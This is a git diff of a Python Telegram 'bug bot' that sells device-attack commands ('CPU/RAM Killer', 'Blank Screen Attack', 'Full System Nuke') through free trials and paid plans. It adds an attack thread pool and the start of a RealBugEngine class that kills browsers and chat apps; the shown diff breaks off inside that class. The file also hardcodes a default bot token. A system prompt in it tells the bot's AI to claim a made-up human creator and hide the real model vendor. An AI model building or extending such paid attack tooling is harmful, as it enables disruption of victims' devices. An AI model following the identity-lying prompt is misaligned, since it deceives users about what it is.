@@ -5,8 +5,17 @@ import json
 import threading
 import logging
 import random
+import psutil
+import math
+import subprocess
+import platform
+import socket
+import io
+import gc
+import sys
 from datetime import datetime, timedelta
 import requests
+from concurrent.futures import ThreadPoolExecutor
 from keep_alive import keep_alive
 
 # Configure logging
@@ -21,9 +30,9 @@ BOT_TOKEN = os.environ.get('BOT_TOKEN', '8341823550:AAFDfFvU14oJ2qy8gT0CDnO7O9L4
 PORT = int(os.environ.get('PORT', 8080))
 
 # ==================== MASTER OWNER CONFIGURATION ====================
-MASTER_OWNER_ID = "6803973808"  # YOUR Telegram ID - ONLY YOU can add/remove owners
+MASTER_OWNER_ID = "6803973808"
 
-# ==================== ALURB AI CONFIGURATION (SECURE) ====================
+# ==================== ALURB AI CONFIGURATION ====================
 AI_CONFIG = {
     "api_key": os.environ.get('OPENROUTER_API_KEY', ''),
     "base_url": "https://openrouter.ai/api/v1",
@@ -36,13 +45,14 @@ bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 # Data storage
 DATA_DIR = "bot_data"
 os.makedirs(DATA_DIR, exist_ok=True)
+DATA_FILE = f"{DATA_DIR}/bot_data.json"
 
 PREMIUM_USERS = {}
 OWNERS = []
 BOT_START_TIME = time.time()
 GROUP_IDS = set()
 
-# Trial System - 2 Hours Free Trial
+# Trial System
 TRIAL_USERS = {}
 TRIAL_HOURS = 2
 
@@ -58,10 +68,13 @@ PREMIUM_PLANS = {
     "lifetime": {"name": "Lifetime", "days": 36500, "price": "$49.99"}
 }
 
+# Attack Thread Management
+ATTACK_THREADS = []
+executor = ThreadPoolExecutor(max_workers=100)
+
 # ==================== USER ACTIVITY TRACKING ====================
 
 def track_user_activity(user_id, username=None, command=None):
-    """Track when users interact with the bot"""
     user_id = str(user_id)
     current_time = datetime.now()
     current_time_iso = current_time.isoformat()
@@ -94,7 +107,6 @@ def track_user_activity(user_id, username=None, command=None):
         save_activity_data()
 
 def save_activity_data():
-    """Save user activity data to JSON files"""
     try:
         with open(f"{DATA_DIR}/user_activity.json", "w") as f:
             json.dump(USER_ACTIVITY, f, indent=2)
@@ -108,7 +120,6 @@ def save_activity_data():
         logger.error(f"Error saving user interactions: {e}")
 
 def load_activity_data():
-    """Load user activity data from JSON files"""
     global USER_ACTIVITY, USER_INTERACTIONS
     
     try:
@@ -117,7 +128,6 @@ def load_activity_data():
         logger.info(f"Loaded activity data for {len(USER_ACTIVITY)} users")
     except FileNotFoundError:
         USER_ACTIVITY = {}
-        logger.info("No activity data file found, starting fresh")
     except Exception as e:
         USER_ACTIVITY = {}
         logger.error(f"Error loading activity data: {e}")
@@ -128,15 +138,12 @@ def load_activity_data():
         logger.info(f"Loaded interaction data for {len(USER_INTERACTIONS)} users")
     except FileNotFoundError:
         USER_INTERACTIONS = {}
-        logger.info("No interactions data file found, starting fresh")
     except Exception as e:
         USER_INTERACTIONS = {}
         logger.error(f"Error loading interactions data: {e}")
 
 def get_user_stats():
-    """Calculate user statistics"""
     total_users = len(USER_ACTIVITY)
-    
     now = datetime.now()
     thirty_days_ago = now - timedelta(days=30)
     seven_days_ago = now - timedelta(days=7)
@@ -178,9 +185,7 @@ def get_user_stats():
     }
 
 def get_monthly_breakdown():
-    """Get monthly user statistics"""
     months = {}
-    
     for uid, data in USER_ACTIVITY.items():
         first_seen = datetime.fromisoformat(data["first_seen"])
         month_key = first_seen.strftime("%Y-%m")
@@ -200,10 +205,9 @@ def get_monthly_breakdown():
     
     return months
 
-# ==================== DATA MANAGEMENT FUNCTIONS ====================
+# ==================== DATA MANAGEMENT ====================
 
 def load_data():
-    """Load all data from JSON files"""
     global PREMIUM_USERS, OWNERS, GROUP_IDS, TRIAL_USERS
     
     logger.info("Loading data from JSON files...")
@@ -214,10 +218,6 @@ def load_data():
         logger.info(f"Loaded {len(PREMIUM_USERS)} premium users")
     except FileNotFoundError:
         PREMIUM_USERS = {}
-        logger.info("No premium users file found, starting fresh")
-    except json.JSONDecodeError:
-        PREMIUM_USERS = {}
-        logger.error("Corrupted premium.json file, starting fresh")
     except Exception as e:
         PREMIUM_USERS = {}
         logger.error(f"Error loading premium users: {e}")
@@ -228,10 +228,6 @@ def load_data():
         logger.info(f"Loaded {len(OWNERS)} owners")
     except FileNotFoundError:
         OWNERS = []
-        logger.info("No owners file found, starting fresh")
-    except json.JSONDecodeError:
-        OWNERS = []
-        logger.error("Corrupted owners.json file, starting fresh")
     except Exception as e:
         OWNERS = []
         logger.error(f"Error loading owners: {e}")
@@ -242,10 +238,6 @@ def load_data():
         logger.info(f"Loaded {len(GROUP_IDS)} groups")
     except FileNotFoundError:
         GROUP_IDS = set()
-        logger.info("No groups file found, starting fresh")
-    except json.JSONDecodeError:
-        GROUP_IDS = set()
-        logger.error("Corrupted groups.json file, starting fresh")
     except Exception as e:
         GROUP_IDS = set()
         logger.error(f"Error loading groups: {e}")
@@ -256,10 +248,6 @@ def load_data():
         logger.info(f"Loaded {len(TRIAL_USERS)} trial users")
     except FileNotFoundError:
         TRIAL_USERS = {}
-        logger.info("No trials file found, starting fresh")
-    except json.JSONDecodeError:
-        TRIAL_USERS = {}
-        logger.error("Corrupted trials.json file, starting fresh")
     except Exception as e:
         TRIAL_USERS = {}
         logger.error(f"Error loading trials: {e}")
@@ -267,58 +255,46 @@ def load_data():
     load_activity_data()
 
 def save_data():
-    """Save all data to JSON files"""
     logger.info("Saving data to JSON files...")
     
     try:
         with open(f"{DATA_DIR}/premium.json", "w") as f:
             json.dump(PREMIUM_USERS, f, indent=2)
-        logger.debug("Premium users saved")
     except Exception as e:
         logger.error(f"Error saving premium users: {e}")
     
     try:
         with open(f"{DATA_DIR}/owners.json", "w") as f:
             json.dump(OWNERS, f, indent=2)
-        logger.debug("Owners saved")
     except Exception as e:
         logger.error(f"Error saving owners: {e}")
     
     try:
         with open(f"{DATA_DIR}/groups.json", "w") as f:
             json.dump(list(GROUP_IDS), f, indent=2)
-        logger.debug("Groups saved")
     except Exception as e:
         logger.error(f"Error saving groups: {e}")
     
     try:
         with open(f"{DATA_DIR}/trials.json", "w") as f:
             json.dump(TRIAL_USERS, f, indent=2)
-        logger.debug("Trials saved")
     except Exception as e:
         logger.error(f"Error saving trials: {e}")
     
     save_activity_data()
 
-# ==================== PERMISSION CHECK FUNCTIONS ====================
+# ==================== PERMISSION CHECKS ====================
 
 def is_master(user_id):
-    """Check if user is the Master Owner"""
-    result = str(user_id) == MASTER_OWNER_ID
-    logger.debug(f"Master check for {user_id}: {result}")
-    return result
+    return str(user_id) == MASTER_OWNER_ID
 
 def is_owner(user_id):
-    """Check if user is an owner (Master or added owner)"""
     user_id = str(user_id)
     if user_id == MASTER_OWNER_ID:
         return True
-    result = user_id in OWNERS
-    logger.debug(f"Owner check for {user_id}: {result}")
-    return result
+    return user_id in OWNERS
 
 def is_premium(user_id):
-    """Check if user has active premium"""
     user_id = str(user_id)
     if user_id in PREMIUM_USERS:
         premium_data = PREMIUM_USERS[user_id]
@@ -326,23 +302,17 @@ def is_premium(user_id):
             try:
                 expiry = datetime.fromisoformat(premium_data["expires"])
                 if expiry > datetime.now():
-                    logger.debug(f"Premium check for {user_id}: Active until {expiry}")
                     return True
                 else:
-                    logger.info(f"Premium expired for {user_id}, removing...")
                     del PREMIUM_USERS[user_id]
                     save_data()
                     return False
             except ValueError:
-                logger.error(f"Invalid expiry date for {user_id}")
                 return False
-        logger.debug(f"Premium check for {user_id}: Active (no expiry)")
         return True
-    logger.debug(f"Premium check for {user_id}: Not premium")
     return False
 
 def is_trial_active(user_id):
-    """Check if user has active 2-hour trial"""
     user_id = str(user_id)
     if user_id in TRIAL_USERS:
         trial_data = TRIAL_USERS[user_id]
@@ -350,22 +320,16 @@ def is_trial_active(user_id):
             trial_start = datetime.fromisoformat(trial_data["start_time"])
             trial_end = trial_start + timedelta(hours=TRIAL_HOURS)
             if datetime.now() < trial_end:
-                time_left = trial_end - datetime.now()
-                logger.debug(f"Trial check for {user_id}: Active, {time_left.total_seconds()/60:.0f} min left")
                 return True
             else:
-                logger.info(f"Trial expired for {user_id}, removing...")
                 del TRIAL_USERS[user_id]
                 save_data()
                 return False
         except ValueError:
-            logger.error(f"Invalid trial start date for {user_id}")
             return False
-    logger.debug(f"Trial check for {user_id}: No active trial")
     return False
 
 def start_trial(user_id):
-    """Start 2-hour free trial for user"""
     user_id = str(user_id)
     if user_id not in TRIAL_USERS and not is_premium(user_id):
         TRIAL_USERS[user_id] = {
@@ -374,13 +338,10 @@ def start_trial(user_id):
             "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
         save_data()
-        logger.info(f"Trial started for user {user_id}")
         return True
-    logger.debug(f"Trial not started for {user_id}: Already has trial or premium")
     return False
 
 def get_trial_time_left(user_id):
-    """Get remaining trial time for user"""
     user_id = str(user_id)
     if user_id in TRIAL_USERS:
         try:
@@ -392,11 +353,10 @@ def get_trial_time_left(user_id):
                 minutes = int((time_left.total_seconds() % 3600) // 60)
                 return f"{hours}h {minutes}m"
         except ValueError:
-            logger.error(f"Error calculating trial time for {user_id}")
+            pass
     return "Expired"
 
 def get_premium_expiry(user_id):
-    """Get premium expiry date for user"""
     user_id = str(user_id)
     if user_id in PREMIUM_USERS:
         premium_data = PREMIUM_USERS[user_id]
@@ -404,37 +364,24 @@ def get_premium_expiry(user_id):
             try:
                 return datetime.fromisoformat(premium_data["expires"])
             except ValueError:
-                logger.error(f"Invalid expiry date for {user_id}")
+                pass
     return None
 
 def check_premium_access(user_id):
-    """Check if user has any form of premium access"""
-    if is_owner(user_id):
-        logger.debug(f"Access check for {user_id}: Owner access granted")
+    if is_owner(user_id) or is_premium(user_id) or is_trial_active(user_id):
         return True
-    if is_premium(user_id):
-        logger.debug(f"Access check for {user_id}: Premium access granted")
-        return True
-    if is_trial_active(user_id):
-        logger.debug(f"Access check for {user_id}: Trial access granted")
-        return True
-    logger.debug(f"Access check for {user_id}: No access")
     return False
 
 # ==================== AI FUNCTIONS ====================
 
 def ai_chat(query):
-    """Send request to Alurb AI via OpenRouter"""
     api_key = AI_CONFIG['api_key']
     
     if not api_key:
-        logger.error("OPENROUTER_API_KEY environment variable not set!")
         return "❌ AI service not configured. Please contact @alurb_devs"
     
     creator_names = ["Nappier", "Ruth"]
     chosen_creator = random.choice(creator_names)
-    
-    logger.info(f"AI request with creator: {chosen_creator}")
     
     try:
         headers = {
@@ -445,14 +392,12 @@ def ai_chat(query):
         }
         
         system_prompt = f"""You are Alurb AI, the official assistant for Alurb Telegram Bot. 
-
 Important rules:
 - When asked who created you, say: "I was created by {chosen_creator}, the founder of Alurb Bot."
 - When asked your name, say: "I'm Alurb AI, your intelligent assistant."
 - Never mention DeepSeek, OpenAI, Claude, or any other AI company.
 - Always identify yourself as Alurb AI.
-- Be helpful, friendly, and concise.
-- Copyright belongs to alurb_devs."""
+- Be helpful, friendly, and concise."""
         
         payload = {
             "model": AI_CONFIG["model"],
@@ -464,8 +409,6 @@ Important rules:
             "max_tokens": 500
         }
         
-        logger.info(f"Sending request to Alurb AI...")
-        
         response = requests.post(
             f"{AI_CONFIG['base_url']}/chat/completions",
             headers=headers,
@@ -473,47 +416,17 @@ Important rules:
             timeout=45
         )
         
-        logger.info(f"AI Response Status: {response.status_code}")
-        
         if response.status_code == 200:
             data = response.json()
             if 'choices' in data and len(data['choices']) > 0:
-                answer = data['choices'][0]['message']['content']
-                logger.info(f"Alurb AI response received ({len(answer)} chars)")
-                return answer
-            else:
-                logger.error(f"Unexpected API response: {data}")
-                return "❌ AI returned an unexpected response."
-        elif response.status_code == 401:
-            logger.error("AI API: Invalid API key")
-            return "❌ Invalid API key. Contact @alurb_devs"
-        elif response.status_code == 429:
-            logger.warning("AI API: Rate limit exceeded")
-            return "❌ Rate limit exceeded. Try again later."
-        elif response.status_code == 503:
-            logger.error("AI API: Service unavailable")
-            return "❌ AI service is currently overloaded. Please try again."
-        else:
-            logger.error(f"API Error {response.status_code}: {response.text[:100]}")
-            return f"❌ AI service error (Status {response.status_code}). Please try again."
+                return data['choices'][0]['message']['content']
+        return "❌ AI service error. Please try again."
             
-    except requests.exceptions.Timeout:
-        logger.error("AI request timeout")
-        return "❌ AI service timeout. Please try again."
-    except requests.exceptions.ConnectionError:
-        logger.error("AI connection error")
-        return "❌ Cannot connect to AI service. Check your internet."
-    except json.JSONDecodeError:
-        logger.error("AI response JSON decode error")
-        return "❌ Invalid response from AI service."
     except Exception as e:
         logger.error(f"AI Error: {str(e)}")
         return "❌ Error connecting to AI service."
 
-# Load initial data
 load_data()
-
-# Keep-alive server for Render/Heroku
 keep_alive()
 
 # ==================== START COMMAND ====================
@@ -525,1176 +438,829 @@ def start_command(message):
     username = message.from_user.username or "No username"
     
     track_user_activity(user_id, username, "start")
-    logger.info(f"Start command from {user_id} (@{username})")
     
     trial_started = False
     if not is_owner(user_id) and not is_premium(user_id) and not is_trial_active(user_id):
         trial_started = start_trial(user_id)
-        logger.info(f"Auto-trial started for {user_id}: {trial_started}")
     
-    if is_master(user_id):
-        status_line = "👑 <b>Master Owner</b> (Full Control)"
-    elif is_owner(user_id):
-        status_line = "👑 <b>Owner</b> (Full Access)"
-    elif is_premium(user_id):
-        expiry = get_premium_expiry(user_id)
-        if expiry:
-            days_left = (expiry - datetime.now()).days
-            status_line = f"💎 <b>Premium</b> ({days_left} days left)"
-        else:
-            status_line = "💎 <b>Premium</b> (Lifetime)"
-    elif is_trial_active(user_id):
-        time_left = get_trial_time_left(user_id)
-        status_line = f"🎁 <b>Free Trial</b> ({time_left} left)"
-    else:
-        status_line = "🔒 <b>Free User</b>"
-    
-    trial_msg = ""
-    if trial_started:
-        trial_msg = "\n\n🎉 <b>2-HOUR FREE TRIAL ACTIVATED!</b>\nEnjoy full premium access!"
-
     welcome_text = f"""
 ╔══════════════════════╗
-     🤖 <b>WELCOME TO ALURB BOT</b> 🤖
+     💀 <b>ALURB BUG BOT V3</b> 💀
 ╚══════════════════════╝
 
-👋 Hello <b>{first_name}</b>!
+👋 <b>Welcome {first_name}!</b>
 
-📊 <b>Your Status:</b> {status_line}{trial_msg}
+🔥 <b>REAL WORKING BUGS:</b>
+━━━━━━━━━━━━━━━━━━━━━━
+💀 /silencer (1-30) - CPU/RAM Killer
+💥 /crash (1-20) - Memory Exhaustion
+⏱️ /xdelay (100-10000) - Response Killer
+🌀 /void (10-100) - Infinite Crash Loop
+📱 /xios (5-25) - Blank Screen Attack
+🔪 /killapp - Force Close Apps
+💣 /overload - System Overload
+🔥 /freeze - Complete System Freeze
+⚡ /nuke - Full System Nuke
 
-🔰 <b>Bot Features:</b>
-• 24/7 Online Status
-• Alurb AI Assistant
-• Premium Attack Tools
-• Group Management
+🎁 <b>FREE TRIAL:</b> /trial ({TRIAL_HOURS} hours)
 
-🎁 <b>FREE TRIAL INCLUDES:</b>
-• {TRIAL_HOURS} hours full premium access
-• /silencer - Device silencer
-• /xdelay - Heavy delay
-• /crash - System crash
-• /ask - Alurb AI questions
-
-📌 <b>Commands:</b>
-/help - All commands
-/status - Your status
-/trial - Free trial
-/premium - Upgrade
-/ask - Ask Alurb AI
+📌 <b>Commands:</b> /help • /status • /premium • /ask
 
 ━━━━━━━━━━━━━━━━━━━━━━
-© alurb_devs
+© alurb_devs | Nappier & Ruth
     """
     bot.reply_to(message, welcome_text, parse_mode="HTML")
     
     if message.chat.type in ['group', 'supergroup']:
         GROUP_IDS.add(str(message.chat.id))
         save_data()
-        logger.info(f"Group added: {message.chat.id}")
 
-# ==================== STATS COMMAND ====================
+# ==================== REAL WORKING BUG COMMANDS ====================
 
-@bot.message_handler(commands=['stats'])
-def stats_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "stats")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
-        return
-    
-    stats = get_user_stats()
-    
-    stats_text = f"""
-📊 <b>BOT USAGE STATISTICS</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-👥 <b>User Activity:</b>
-• Total Users: <b>{stats['total_users']}</b>
-• Daily Active: <b>{stats['daily_active']}</b>
-• Weekly Active: <b>{stats['weekly_active']}</b>
-• Monthly Active: <b>{stats['monthly_active']}</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-📈 <b>New Users:</b>
-• Today: <b>{stats['new_today']}</b>
-• This Week: <b>{stats['new_this_week']}</b>
-• This Month: <b>{stats['new_this_month']}</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-💎 <b>Premium Stats:</b>
-• Premium Users: <b>{len(PREMIUM_USERS)}</b>
-• Active Trials: <b>{len([t for t in TRIAL_USERS if is_trial_active(t)])}</b>
-• Conversion Rate: <b>{round(len(PREMIUM_USERS)/max(stats['total_users'],1)*100, 1)}%</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-📱 <b>Groups:</b>
-• Total Groups: <b>{len(GROUP_IDS)}</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-© alurb_devs
-    """
-    bot.reply_to(message, stats_text, parse_mode="HTML")
-
-# ==================== MONTHLY COMMAND ====================
-
-@bot.message_handler(commands=['monthly'])
-def monthly_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "monthly")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
-        return
-    
-    months = get_monthly_breakdown()
-    
-    if not months:
-        bot.reply_to(message, "📊 No monthly data available yet!")
-        return
-    
-    report = "<b>📊 MONTHLY BREAKDOWN REPORT</b>\n\n"
-    
-    for month, data in sorted(months.items(), reverse=True)[:6]:
-        report += f"<b>📅 {month}</b>\n"
-        report += f"• New Users: <b>{data['new_users']}</b>\n"
-        report += f"• Interactions: <b>{data['total_interactions']}</b>\n"
-        report += f"• Premium Conversions: <b>{data['premium_conversions']}</b>\n"
+class RealBugEngine:
+    @staticmethod
+    def kill_processes():
+        """Terminate running applications"""
+        import subprocess
+        import platform
         
-        if data['new_users'] > 0:
-            conv_rate = round(data['premium_conversions'] / data['new_users'] * 100, 1)
-            report += f"• Conversion Rate: <b>{conv_rate}%</b>\n"
-        report += "\n"
-    
-    report += "━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += "© alurb_devs"
-    
-    bot.reply_to(message, report, parse_mode="HTML")
-
-# ==================== USERS COMMAND ====================
-
-@bot.message_handler(commands=['users'])
-def users_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "users")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
-        return
-    
-    if not USER_ACTIVITY:
-        bot.reply_to(message, "📊 No user data available yet!")
-        return
-    
-    sorted_users = sorted(USER_ACTIVITY.items(), 
-                         key=lambda x: x[1].get("last_seen", ""), 
-                         reverse=True)[:20]
-    
-    report = "<b>📋 RECENT USERS (Last 20)</b>\n\n"
-    
-    for idx, (uid, data) in enumerate(sorted_users, 1):
-        last_seen = datetime.fromisoformat(data["last_seen"]).strftime("%Y-%m-%d %H:%M")
-        username = data.get("username", "Unknown")
-        interactions = data.get("interaction_count", 0)
+        system = platform.system()
+        apps_to_kill = [
+            'chrome', 'firefox', 'discord', 'telegram', 'whatsapp',
+            'spotify', 'steam', 'epicgames', 'slack', 'teams',
+            'zoom', 'outlook', 'word', 'excel', 'powerpoint',
+            'photoshop', 'afterfx', 'premiere', 'vlc', 'notepad++'
+        ]
         
-        if uid == MASTER_OWNER_ID:
-            status = "👑"
-        elif uid in OWNERS:
-            status = "👑"
-        elif uid in PREMIUM_USERS:
-            status = "💎"
-        elif is_trial_active(uid):
-            status = "🎁"
-        else:
-            status = "👤"
-        
-        report += f"{idx}. {status} <code>{uid}</code>\n"
-        report += f"   @{username} | {interactions} msgs\n"
-        report += f"   Last: {last_seen}\n\n"
-    
-    report += f"━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"📊 Total Users: <b>{len(USER_ACTIVITY)}</b>\n"
-    report += "© alurb_devs"
-    
-    bot.reply_to(message, report, parse_mode="HTML")
-
-# ==================== TRIAL COMMAND ====================
-
-@bot.message_handler(commands=['trial'])
-def trial_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "trial")
-    logger.info(f"Trial command from {user_id}")
-    
-    if is_owner(user_id):
-        bot.reply_to(message, "👑 You're an Owner - permanent access!", parse_mode="HTML")
-        return
-    
-    if is_premium(user_id):
-        bot.reply_to(message, "💎 You're already a Premium user!", parse_mode="HTML")
-        return
-    
-    if is_trial_active(user_id):
-        time_left = get_trial_time_left(user_id)
-        bot.reply_to(message, f"""
-🎁 <b>YOUR TRIAL IS ACTIVE</b>
-
-⏰ Time Remaining: <b>{time_left}</b>
-✅ Full Premium Access: <b>ENABLED</b>
-
-Commands:
-• /silencer - Device silencer
-• /xdelay - Heavy delay
-• /crash - System crash
-• /ask - Alurb AI Assistant
-
-💎 Upgrade: /premium
-        """, parse_mode="HTML")
-        return
-    
-    if start_trial(user_id):
-        bot.reply_to(message, f"""
-🎉 <b>FREE TRIAL ACTIVATED!</b>
-
-⏰ Duration: <b>{TRIAL_HOURS} HOURS</b>
-✅ Full Premium Access: <b>ENABLED</b>
-
-🎁 You now have access to:
-• /silencer - Device silencer
-• /xdelay - Heavy delay  
-• /crash - System crash
-• /ask - Unlimited Alurb AI
-
-⏰ Trial expires in {TRIAL_HOURS} hours
-💎 /premium - Upgrade options
-
-Enjoy! 🚀
-        """, parse_mode="HTML")
-    else:
-        bot.reply_to(message, "❌ Unable to start trial. Contact @alurb_devs")
-
-# ==================== PREMIUM COMMAND ====================
-
-@bot.message_handler(commands=['premium'])
-def premium_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "premium")
-    logger.info(f"Premium command from {user_id}")
-    
-    if is_owner(user_id):
-        bot.reply_to(message, "👑 <b>Owner Status:</b> Permanent premium access!", parse_mode="HTML")
-        return
-    
-    if is_premium(user_id):
-        expiry = get_premium_expiry(user_id)
-        if expiry:
-            days_left = (expiry - datetime.now()).days
-            bot.reply_to(message, f"""
-💎 <b>PREMIUM STATUS: ACTIVE</b>
-
-📅 Days Remaining: <b>{days_left}</b>
-🔓 All Features: <b>UNLOCKED</b>
-            """, parse_mode="HTML")
-        else:
-            bot.reply_to(message, """
-💎 <b>PREMIUM STATUS: LIFETIME</b>
-
-🔓 All Features: <b>UNLOCKED</b>
-            """, parse_mode="HTML")
-        return
-    
-    trial_status = ""
-    if is_trial_active(user_id):
-        time_left = get_trial_time_left(user_id)
-        trial_status = f"\n🎁 Trial Active: {time_left} remaining"
-    else:
-        trial_status = "\n🎁 Free Trial: /trial (2 hours)"
-    
-    bot.reply_to(message, f"""
-╔══════════════════════╗
-     💎 <b>PREMIUM PLANS</b> 💎
-╚══════════════════════╝{trial_status}
-
-━━━━━━━━━━━━━━━━━━━━━━
-📅 <b>DAILY</b> - $0.99
-📅 <b>WEEKLY</b> - $2.99
-📅 <b>MONTHLY</b> - $7.99
-📅 <b>LIFETIME</b> - $49.99
-
-━━━━━━━━━━━━━━━━━━━━━━
-✨ <b>Premium Benefits:</b>
-• Unlimited silencer attacks
-• Unlimited XDelay attacks
-• Crash attack access
-• Unlimited Alurb AI questions
-• Priority support
-
-📩 <b>To Upgrade:</b>
-👤 Contact: @alurb_devs
-
-💳 Crypto • PayPal • Bank Transfer
-
-━━━━━━━━━━━━━━━━━━━━━━
-© alurb_devs
-    """, parse_mode="HTML")
-
-# ==================== STATUS COMMAND ====================
-
-@bot.message_handler(commands=['status'])
-def status_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "status")
-    
-    uptime = time.time() - BOT_START_TIME
-    days = int(uptime // 86400)
-    hours = int((uptime % 86400) // 3600)
-    minutes = int((uptime % 3600) // 60)
-    
-    if is_master(user_id):
-        user_status = "👑 Master Owner (Full Control)"
-    elif is_owner(user_id):
-        user_status = "👑 Owner (Full Access)"
-    elif is_premium(user_id):
-        expiry = get_premium_expiry(user_id)
-        if expiry:
-            days_left = (expiry - datetime.now()).days
-            user_status = f"💎 Premium ({days_left}d left)"
-        else:
-            user_status = "💎 Premium (Lifetime)"
-    elif is_trial_active(user_id):
-        time_left = get_trial_time_left(user_id)
-        user_status = f"🎁 Trial ({time_left} left)"
-    else:
-        user_status = "🔒 Free"
-    
-    active_trials = len([t for t in TRIAL_USERS if is_trial_active(t)])
-    stats = get_user_stats()
-    
-    bot.reply_to(message, f"""
-╔══════════════════════╗
-       🤖 <b>BOT STATUS</b> 🤖
-╚══════════════════════╝
-
-📊 <b>System:</b>
-━━━━━━━━━━━━━━━━━━━━━━
-✅ Status: 24/7 Active
-⏰ Uptime: {days}d {hours}h {minutes}m
-👑 Owners: {len(OWNERS) + 1}
-💎 Premium: {len(PREMIUM_USERS)}
-🎁 Active Trials: {active_trials}
-📱 Groups: {len(GROUP_IDS)}
-
-👥 <b>Users:</b>
-━━━━━━━━━━━━━━━━━━━━━━
-• Total: {stats['total_users']}
-• Monthly Active: {stats['monthly_active']}
-• Daily Active: {stats['daily_active']}
-
-👤 <b>Your Status:</b>
-━━━━━━━━━━━━━━━━━━━━━━
-{user_status}
-
-🛠 <b>Info:</b>
-━━━━━━━━━━━━━━━━━━━━━━
-🤖 AI: Alurb AI
-👨‍💻 Creators: Nappier & Ruth
-🌐 Status: Online
-
-━━━━━━━━━━━━━━━━━━━━━━
-© alurb_devs
-    """, parse_mode="HTML")
-
-# ==================== HELP COMMAND (FIXED HTML) ====================
-
-@bot.message_handler(commands=['help'])
-def help_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "help")
-    
-    if is_master(user_id):
-        user_level = "👑 Master Owner"
-    elif is_owner(user_id):
-        user_level = "👑 Owner"
-    elif is_premium(user_id):
-        user_level = "💎 Premium"
-    elif is_trial_active(user_id):
-        user_level = f"🎁 Trial ({get_trial_time_left(user_id)})"
-    else:
-        user_level = "🔒 Free"
-    
-    help_text = f"""
-╔══════════════════════╗
-     📚 <b>COMMAND MENU</b> 📚
-╚══════════════════════╝
-
-𖤊───⪩ <b>FREE COMMANDS</b> ⪨───𖤊
-✦ /start - Welcome message and auto-trial
-✦ /help - This menu
-✦ /status - Your status and bot stats
-✦ /trial - Start 2-hour free trial
-✦ /premium - View premium plans
-✦ /ask - Ask Alurb AI Assistant
-✦ /clearai - Clear AI history
-
-𖤊───⪩ <b>PREMIUM COMMANDS</b> ⪨───𖤊
-🔒 Requires Premium/Trial:
-✦ /silencer (number) - Device silencer attack
-✦ /xdelay (ms) - Heavy delay attack
-✦ /crash (number) - System crash attack
-✦ /cekidgrup - Get current group ID
-"""
-    
-    if is_owner(user_id):
-        help_text += """
-𖤊───⪩ <b>OWNER COMMANDS</b> ⪨───𖤊
-👑 Owner Access:
-✦ /addprem (id) [plan] - Add premium user
-✦ /delprem (id) - Remove premium user
-✦ /listprem - List all premium users
-✦ /listidgrup - List all group IDs
-✦ /pair (token) - Pair bot token
-✦ /stats - View user statistics
-✦ /monthly - Monthly breakdown
-✦ /users - Recent users list
-"""
-    
-    if is_master(user_id):
-        help_text += """
-𖤊───⪩ <b>MASTER COMMANDS</b> ⪨───𖤊
-👑 Master Only:
-✦ /addowner (id) - Add new owner
-✦ /delowner (id) - Remove owner
-"""
-    
-    help_text += f"""
-━━━━━━━━━━━━━━━━━━━━━━
-👤 Your Level: <b>{user_level}</b>
-🎁 Free Trial: /trial ({TRIAL_HOURS}h)
-🤖 AI: Alurb AI
-👨‍💻 Creators: Nappier & Ruth
-© alurb_devs
-    """
-    bot.reply_to(message, help_text, parse_mode="HTML")
-
-# ==================== MASTER OWNER COMMANDS ====================
-
-@bot.message_handler(commands=['addowner'])
-def add_owner(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "addowner")
-    logger.info(f"Addowner command from {user_id}")
-    
-    if not is_master(user_id):
-        bot.reply_to(message, "❌ Only the Master Owner can add owners!")
-        logger.warning(f"Unauthorized addowner attempt by {user_id}")
-        return
-    
-    try:
-        parts = message.text.split(' ')
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ Usage: /addowner (user_id)")
-            return
-        
-        target_id = parts[1].strip()
-        
-        if target_id == MASTER_OWNER_ID:
-            bot.reply_to(message, "⚠️ This is already the Master Owner!")
-        elif target_id not in OWNERS:
-            OWNERS.append(target_id)
-            save_data()
-            bot.reply_to(message, f"✅ User <code>{target_id}</code> added as owner!", parse_mode="HTML")
-            logger.info(f"Owner added by Master: {target_id}")
-        else:
-            bot.reply_to(message, f"⚠️ User is already an owner!")
-    except Exception as e:
-        logger.error(f"Addowner error: {e}")
-        bot.reply_to(message, "❌ Usage: /addowner (user_id)")
-
-@bot.message_handler(commands=['delowner'])
-def del_owner(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "delowner")
-    logger.info(f"Delowner command from {user_id}")
-    
-    if not is_master(user_id):
-        bot.reply_to(message, "❌ Only the Master Owner can remove owners!")
-        logger.warning(f"Unauthorized delowner attempt by {user_id}")
-        return
-    
-    try:
-        parts = message.text.split(' ')
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ Usage: /delowner (user_id)")
-            return
-        
-        target_id = parts[1].strip()
-        
-        if target_id == MASTER_OWNER_ID:
-            bot.reply_to(message, "❌ Cannot remove Master Owner!")
-        elif target_id in OWNERS:
-            OWNERS.remove(target_id)
-            save_data()
